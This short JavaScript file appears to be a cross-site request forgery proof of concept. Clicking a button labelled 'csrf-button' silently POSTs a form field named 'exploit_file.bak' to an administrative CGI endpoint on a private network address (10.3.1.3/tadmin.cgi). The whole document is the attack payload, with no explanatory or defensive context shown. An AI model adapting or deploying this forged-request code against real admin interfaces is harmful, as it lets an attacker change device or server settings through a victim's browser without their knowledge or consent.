function sendData() {
  var XHR = new XMLHttpRequest();
  var url = "http://10.3.1.3/tadmin.cgi";
  var exploit_file = "exploit_file.bak";
  var FD  = new FormData();

  FD.append("file", exploit_file)

  // Set up our request
  XHR.open('POST', url);

  // Set the content type
  XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  // Submit the form
  XHR.send(FD);
}


window.onload = function() {
	var button = document.getElementById("csrf-button");
	button.onclick = function() {
		sendData();
	}
}